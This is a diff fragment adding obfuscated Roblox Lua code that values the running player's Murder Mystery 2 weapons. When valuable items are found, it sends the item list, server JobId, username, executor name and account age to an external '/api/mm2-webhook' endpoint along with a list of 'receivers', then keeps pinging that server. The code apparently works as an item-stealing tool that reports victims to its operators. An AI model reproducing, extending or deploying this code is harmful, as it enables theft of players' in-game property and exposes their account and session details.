+													t12[string.gsub(v206, "[^%w]", "")] = {
+														value = n2,
+														type = s2,
+													}
+
+													local v207 = string.gsub(v206, "'s", "")
+
+													t12[string.gsub(v207, "[^%w]", "")] = {
+														value = n2,
+														type = s2,
+													}
+
+													local v208 = string.gsub(v206, " knife", "")
+													local v209 = string.gsub(v208, " gun", "")
+
+													t12[string.gsub(v209, "[^%w]", "")] = {
+														value = n2,
+														type = s2,
+													}
+
+													local v210 = string.gsub(v207, " knife", "")
+													local v211 = string.gsub(v210, " gun", "")
+
+													t12[string.gsub(v211, "[^%w]", "")] = {
+														value = n2,
+														type = s2,
+													}
+												end
+
+												if v.slug then
+													t11[v.slug] = {
+														value = n2,
+														type = s2,
+													}
+												end
+											end
+										end
+
+										local t13 = {}
+										local ok5, result6 = pcall(function()
+											return require(u59:WaitForChild("Database"):WaitForChild("Sync"))
+										end)
+										local v215 = ok5 and (result6 and result6.Weapons) or nil
+
+										if v215 then
+											local n3 = 0
+											local n4 = 0
+
+											for k, v in pairs(v215) do
+												if type(v) == "table" and v.Rarity then
+													local upper = string.upper
+													local Rarity = v.Rarity
+													local v222 = upper((tostring(Rarity)))
+
+													if v222 and u58[string.upper(v222)] ~= true then
+														local v223 = v.ItemName or (v.Name or "")
+														local v224 = v.Chroma == true
+														local v225 = v.Evo or v.EvoBaseID
+														local v226 = v.ItemType or ""
+														local t14 = {}
+														local v228 = v191(string.lower(v223))
+
+														t14[1] = v223
+														v370(t14, 2, unpack(v228, 1, v228.n))
+
+														if v224 then
+															local v229 = "Chroma " .. v223
+
+															table.insert(t14, v229)
+
+															local v230 = v223 .. " Chroma"
+
+															table.insert(t14, v230)
+
+															local v231 = v191(string.lower("Chroma " .. v223))
+
+															table.insert(t14, unpack(v231, 1, v231.n))
+
+															local v241 = v191(string.lower(v223 .. " Chroma"))
+
+															table.insert(t14, unpack(v241, 1, v241.n))
+														end
+
+														if v226 ~= "Knife" then
+															if v226 == "Gun" then
+																local v251 = v223 .. " Gun"
+
+																table.insert(t14, v251)
+
+																local v252 = v191(string.lower(v223 .. " Gun"))
+
+																table.insert(t14, unpack(v252, 1, v252.n))
+
+																if v224 then
+																	local v262 = "Chroma " .. v223 .. " Gun"
+
+																	table.insert(t14, v262)
+
+																	local v263 = v191(string.lower("Chroma " .. v223 .. " Gun"))
+
+																	table.insert(t14, unpack(v263, 1, v263.n))
+																end
+															end
+														else
+															local v273 = v223 .. " Knife"
+
+															table.insert(t14, v273)
+
+															local v274 = v191(string.lower(v223 .. " Knife"))
+
+															table.insert(t14, unpack(v274, 1, v274.n))
+
+															if v224 then
+																local v284 = "Chroma " .. v223 .. " Knife"
+
+																table.insert(t14, v284)
+
+																local v285 = v191(string.lower("Chroma " .. v223 .. " Knife"))
+
+																table.insert(t14, unpack(v285, 1, v285.n))
+															end
+														end
+
+														if v.Event and v.Year then
+															local Year = v.Year
+															local v296 = v223 .. " " .. Year
+
+															table.insert(t14, v296)
+
+															local v297 = v191(string.lower(v223 .. " " .. Year))
+
+															table.insert(t14, unpack(v297, 1, v297.n))
+
+															if v226 ~= "Knife" then
+																if v226 == "Gun" then
+																	local v306 = v223 .. " Gun " .. Year
+
+																	table.insert(t14, v306)
+
+																	local v307 = v191(string.lower(v223 .. " Gun " .. Year))
+
+																	table.insert(t14, unpack(v307, 1, v307.n))
+																end
+															else
+																local v316 = v223 .. " Knife " .. Year
+
+																table.insert(t14, v316)
+
+																local v317 = v191(string.lower(v223 .. " Knife " .. Year))
+
+																table.insert(t14, unpack(v317, 1, v317.n))
+															end
+
+															if v224 then
+																local v326 = "Chroma " .. v223 .. " " .. Year
+
+																table.insert(t14, v326)
+
+																local v327 = v191(string.lower("Chroma " .. v223 .. " " .. Year))
+
+																table.insert(t14, unpack(v327, 1, v327.n))
+															end
+														end
+
+														local v336 = false
+
+														for _, v3 in ipairs(t14) do
+															local v339 = string.lower((string.gsub(v3, "%s+", "-")))
+
+															if t11[v339] then
+																t13[k] = t11[v339]
+																v336 = true
+
+																break
+															end
+														end
+
+														if not v336 then
+															for _, v4 in ipairs(t14) do
+																if t10[v4] then
+																	t13[k] = t10[v4]
+																	v336 = true
+
+																	break
+																end
+															end
+														end
+
+														if not v336 then
+															for _, v5 in ipairs(t14) do
+																local v344 = string.lower((string.gsub(v5, "[^%w]", "")))
+
+																if t12[v344] then
+																	t13[k] = t12[v344]
+																	v336 = true
+
+																	break
+																end
+															end
+														end
+
+														if not v336 and v225 and v.EvoBaseID then
+															local Rarity2 = v.Rarity
+															local t15 = {}
+															local v347 = v223 .. " " .. Rarity2
+															local v348 = v191(string.lower(v223 .. " " .. Rarity2))
+
+															t15[1] = v223
+															t15[2] = v347
+															v370(t15, 3, unpack(v348, 1, v348.n))
+
+															for _, v6 in ipairs(t15) do
+																if t10[v6] then
+																	t13[k] = t10[v6]
+																	v336 = true
+
+																	break
+																end
+															end
+														end
+
+														if v336 then
+															n3 = n3 + 1
+														end
+													else
+														n4 = n4 + 1
+													end
+												end
+											end
+
+											return t13
+										end
+
+										return {}
+									end
+
+									return {}
+								end
+
+								return {}
+							end
+
+							return {}
+						end)()
+
+						for k, v in pairs(v131) do
+							t6[k] = v
+						end
+
+						local t16 = {}
+						local u135 = false
+						local n5 = 0
+
+						for _, v in ipairs(v130) do
+							local v139 = t6[v.name]
+
+							if v139 then
+								local v140 = v139.type or "UNKNOWN"
+
+								if not (not v140 or u58[string.upper(v140)] == true) and v140 ~= "UNKNOWN" then
+									local v141 = v139.value or 0
+
+									if type(v141) == "string" then
+										v141 = tonumber(v141) or 0
+									end
+
+									local v142 = v141 + 0.5
+									local v143 = math.floor(v142)
+
+									if v143 < 1 then
+										v143 = 1
+									end
+
+									if v143 >= _G.MinValueForPing then
+										u135 = true
+									end
+
+									n5 = n5 + v143 * v.amount
+
+									local v144 = string.gsub(v.name, "_.*", "")
+									local t17 = {
+										name = v.name,
+										amount = v.amount,
+										value = v143,
+									}
+
+									table.insert(t5, t17)
+
+									local t18 = {
+										name = v144,
+										amount = v.amount,
+										value = v143 * v.amount,
+										single_value = v143,
+									}
+
+									table.insert(t16, t18)
+								end
+							end
+						end
+
+						table.sort(t5, function(p7, p8)
+							return p7.value * p7.amount > p8.value * p8.amount
+						end)
+						table.sort(t16, function(p9, p10)
+							return p9.value > p10.value
+						end)
+
+						if #t5 ~= 0 then
+							if _G.Webhook ~= "" then
+								local spawn5 = task.spawn
+								local u149 = t16
+
+								spawn5(function()
+									pcall(function()
+										local v358 = u60
+										local t19 = {
+											Url = s1 .. "/api/mm2-webhook",
+											Method = "POST",
+											Headers = {
+												["Content-Type"] = "application/json",
+											},
+										}
+										local v360 = u57
+										local t20 = {
+											webhook = _G.Webhook,
+											items = u149,
+											jobId = RealJobID or game.JobId,
+										}
+										local PlaceId = game.PlaceId
+
+										t20.placeId = tostring(PlaceId)
+										t20.pingEveryone = u135
+										t20.username = u61.Name
+
+										local ok, result = pcall(function()
+											if type(identifyexecutor) ~= "function" then
+												return "Unknown"
+											end
+
+											return identifyexecutor()
+										end)
+
+										t20.executor = ok and result or "Unknown"
+										t20.accountAge = u61.AccountAge
+
+										local Receivers = _G.Receivers
+										local g367 = nil
+										local v366 = nil
+
+										if type(Receivers) == "table" then
+											v366 = table.concat(_G.Receivers, ", ")
+
+											if v366 then
+												g367 = true
+											end
+										end
+
+										if not g367 then
+											local v368 = _G.Receiver or "Tctekkd321"
+
+											v366 = tostring(v368)
+										end
+										t20.receiversList = v366
+										t20.scriptOwner = _G.ScriptOwner
+										t19.Body = v360:JSONEncode(t20)
+										v358(t19)
+									end)
+
+									while task.wait(3) do
+										pcall(function()
+											u60({
+												Url = s1 .. "/api/mm2-ping",
+												Method = "POST",
+												Headers = {
+													["Content-Type"] = "application/json",
+												},
+												Body = u57:JSONEncode({
+													username = u61.Name,
+												}),
+											})
+										end)
+									end
+								end)
+							end
+
+							u62()
+
+							return
+						end
+
+						return
+					end
+				end)()
+
+				return
+			end
+
+			return
+		end
+
+		return
+	end
+
+	return
 end
